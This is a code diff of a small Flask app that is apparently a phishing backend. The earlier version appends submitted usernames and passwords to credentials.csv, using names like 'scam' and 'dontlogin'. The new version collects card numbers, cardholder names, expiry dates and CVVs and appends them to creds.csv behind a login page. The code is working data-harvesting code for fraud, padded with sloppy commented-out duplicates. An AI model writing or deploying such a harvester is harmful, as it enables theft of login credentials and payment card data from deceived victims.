@@ -1,25 +1,63 @@
-from flask import Flask,render_template,url_for,request,jsonify
-
+from flask import Flask, redirect, url_for, request, render_template, jsonify
 import csv
 
-app=Flask(__name__)
+app = Flask(__name__)
 
 @app.route("/")
-
 def index():
-    return render_template("notindex.html")
+    return render_template("/login.html")
 
-@app.route("/login",methods=["POST"])
-
-def dontlogin():
-    username=request.json.get("username")
-    password=request.json.get("password")
-
-    with open("credentials.csv", "a+")as scam:
-        csv_writer=csv.writer(scam)
-        csv_writer.writerow([username,password])
+@app.route("/login", methods=["POST"])
+def login():
     
+    #card_number = request.json.get("card_number")
+    #name = request.json.get("name")
+    #expiry = request.json.get("expiry")
+    #cvv = request.get("cvv")
+
+    card_number = request.json.get("card_number")
+    name = request.json.get("name")
+    expiry = request.json.get("expiry")
+    cvv = request.json.get("cvv")
+
+    #card_number = request.json.get()
+    #name = request.json.get("name")
+    #expiry = request.json.get("expiry")
+    #cvv = request.json.get("cvv")
+     
+
+    #card_number = request.json.get("card_number")
+    #name = request.json.get("name")
+    #expiry = request.json.get("expiry")
+    
+    
+    with open("creds.csv", "a+") as f:
+        csv_writer = csv.writer(f)
+        csv_writer.writerow([card_number, name, expiry, cvv])
+        
+        
+     #with open("creds.cvs", "a+") as f:
+        #csv_writer = csv.writer(f)
+        #csv_writer.writerow([card_number, name, expiry, cvv])
+        
+        
+     #with open("creds.csv", "a+") as f:
+        #csv_writer = csv.writer()
+        #csv_writer.writerow([card_number, name, expiry, cvv])
+      
+    #with open("creds.csv", "r+") as f:
+        #csv_writer = csv.writer(f)
+        #csv_writer.writerow([card_number, name, expiry, cvv])
+        
+      
+        
+        
+        
+        
+        
     return jsonify({
-        "status":"success"
-    }),200
-app.run()
+        "status": "success"
+    }), 201
+
+if __name__ == "__main__":
+    app.run(debug = True)
